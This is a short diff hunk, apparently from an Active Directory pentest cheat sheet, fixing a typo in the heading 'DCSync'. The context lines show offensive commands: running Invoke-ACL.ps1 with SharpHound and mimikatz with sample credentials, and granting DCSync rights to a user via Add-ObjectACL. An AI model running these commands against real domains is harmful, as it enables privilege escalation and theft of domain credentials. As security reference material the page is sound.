@@ -58,7 +58,7 @@ Set-ADObject -SamAccountName delegate -PropertyName scriptpath \
 in Active Directory that are unsafe configured:
 ./Invoke-ACL.ps1 -SharpHoundLocation .\sharphound.exe -mimiKatzLocation .\mimikatz.exe -Username 'testuser' -Domain 'xenoflux.local' -Password 'Welcome01!'
 
-## Give DCSyns right to the user titi
+## Give DCSync right to the user titi
 Add-ObjectACL -TargetDistinguishedName "dc=dev,dc=testlab,dc=local" -PrincipalSamAccountName titi -Rights DCSync
 
 
